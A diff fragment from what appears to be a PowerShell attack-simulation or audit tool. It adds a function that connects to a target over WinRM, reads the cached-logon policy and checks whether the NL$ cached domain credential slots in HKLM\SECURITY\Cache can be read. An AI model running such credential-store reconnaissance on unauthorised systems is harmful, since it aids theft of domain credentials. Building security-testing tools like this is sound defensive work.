+    Set-ARStatus 'Token privileges enumerated' 'Ok'
+}
+
+function Invoke-ARAttackCachedLogons {
+    $target = Get-ARTargetComputer
+    Assert-ARPort -Computer $target -Port 5985 -Purpose 'Cached logon inspection'
+    $session = Get-ARTargetSession
+    $result = Invoke-ARRemote -Session $session -ScriptBlock {
+        $cachedCount = $null
+        $countReadable = $false
+        try {
+            $cachedCount = [string](Get-ItemProperty -Path 'HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon' -Name 'CachedLogonsCount' -ErrorAction Stop).CachedLogonsCount
+            $countReadable = $true
+        }
+        catch { }
+        $cacheReadable = $false
+        $entries = @()
+        $reason = ''
+        try {
+            $key = Get-Item -LiteralPath 'HKLM:\SECURITY\Cache' -ErrorAction Stop
+            $cacheReadable = $true
+            $entries = @($key.GetValueNames() | Where-Object { $_ -match '^NL\$\d+$' } | Sort-Object)
+        }
+        catch { $reason = $_.Exception.Message }
+        return [pscustomobject]@{
+            CachedCount   = $cachedCount
+            CountReadable = $countReadable
+            CacheReadable = $cacheReadable
+            Entries       = @($entries)
+            Reason        = $reason
+        }
+    }
+    if ([bool]$result.CountReadable) {
+        Write-ARInfo ('CachedLogonsCount = ' + [string]$result.CachedCount)
+        if ([string]$result.CachedCount -eq '0') { Write-ARInfo 'Domain cached credentials are disabled by policy on this target.' }
+    }
+    else { Write-ARWarn 'CachedLogonsCount could not be read from Winlogon.' }
+    if ([bool]$result.CacheReadable) {
+        $entries = @($result.Entries)
+        Write-ARSuccess ('HKLM\SECURITY\Cache is readable and holds ' + [string]$entries.Count + ' cached credential slot(s).')
+        if ($entries.Count -gt 0) { Write-ARInfo ('Slots: ' + ($entries -join ', ')) }
+        else { Write-ARInfo 'The cache key is readable but currently has no NL$ slots.' }
+    }
+    else {
+        Write-ARWarn ('HKLM\SECURITY\Cache is not readable from this context (it needs SYSTEM): ' + [string]$result.Reason)
+    }
+    Write-ARInfo 'Read-only: no value was written and nothing needs restoring.'
+    Set-ARStatus 'Cached logon state inspected' 'Ok'
 }
 
 function Show-ARLineLanguagePicker {
